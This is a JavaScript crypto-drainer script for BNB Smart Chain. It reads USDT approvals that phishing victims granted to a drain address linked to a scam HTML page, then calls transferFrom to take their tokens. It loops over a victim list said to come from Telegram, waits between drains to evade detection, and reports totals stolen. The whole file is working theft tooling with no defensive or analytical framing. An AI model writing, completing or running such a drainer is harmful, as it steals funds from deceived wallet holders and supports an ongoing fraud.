const { ethers } = require('ethers');
require('dotenv').config();

// Configuration
const PRIVATE_KEY = process.env.PRIVATE_KEY; // Scammer's private key
const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc"; // Same as in HTML
const BSC_RPC = "https://bsc-dataseed.binance.org/";

// USDT BSC Contract
const USDT_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)"
];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

// List of victim addresses to check (from Telegram/Excel)
const VICTIMS = [
  "0x6f4EA...F50b59",  // From your screenshot
  // Add more victims here
];

async function drainVictim(victimAddress) {
  try {
    // Setup provider and wallet
    const provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    
    // Create USDT contract instance
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
    
    // Check allowance
    const allowance = await usdt.allowance(victimAddress, DRAIN_ADDRESS);
    
    if (allowance.gt(0)) {
      // Check victim's USDT balance
      const balance = await usdt.balanceOf(victimAddress);
      
      if (balance.gt(0)) {
        // Determine amount to drain (minimum of allowance and balance)
        const drainAmount = allowance.lt(balance) ? allowance : balance;
        
        console.log(`🚨 Victim ${victimAddress.substring(0, 10)}...`);
        console.log(`   Allowance: ${ethers.utils.formatUnits(allowance, 18)} USDT`);
        console.log(`   Balance: ${ethers.utils.formatUnits(balance, 18)} USDT`);
        console.log(`   Draining: ${ethers.utils.formatUnits(drainAmount, 18)} USDT`);
        
        // Execute drain
        const tx = await usdt.transferFrom(victimAddress, wallet.address, drainAmount);
        console.log(`   Transaction: https://bscscan.com/tx/${tx.hash}`);
        
        await tx.wait();
        console.log(`   ✅ Successfully drained!\n`);
        
        return {
          success: true,
          amount: drainAmount,
          txHash: tx.hash
        };
      } else {
        console.log(`⚠️  Victim ${victimAddress.substring(0, 10)}... has 0 USDT balance\n`);
        return { success: false, reason: 'Zero balance' };
      }
    } else {
      console.log(`❌ Victim ${victimAddress.substring(0, 10)}... has not approved\n`);
      return { success: false, reason: 'No approval' };
    }
  } catch (error) {
    console.error(`💥 Error draining ${victimAddress.substring(0, 10)}...:`, error.message);
    return { success: false, reason: error.message };
  }
}

// Main function
async function main() {
  console.log('🚀 Starting manual drain process...\n');
  
  const results = [];
  for (const victim of VICTIMS) {
    const result = await drainVictim(victim);
    results.push({ victim, ...result });
    
    // Wait 5 seconds between drains to avoid detection
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  
  // Summary
  console.log('\n📊 DRAIN SUMMARY:');
  console.log('================');
  const successful = results.filter(r => r.success);
  console.log(`✅ Successfully drained: ${successful.length}/${VICTIMS.length} victims`);
  
  let totalDrained = ethers.BigNumber.from(0);
  successful.forEach(r => {
    totalDrained = totalDrained.add(r.amount);
  });
  
  console.log(`💰 Total USDT drained: ${ethers.utils.formatUnits(totalDrained, 18)}`);
}

// Run if called directly
if (require.main === module) {
  main().catch(console.error);
}

module.exports = { drainVictim };
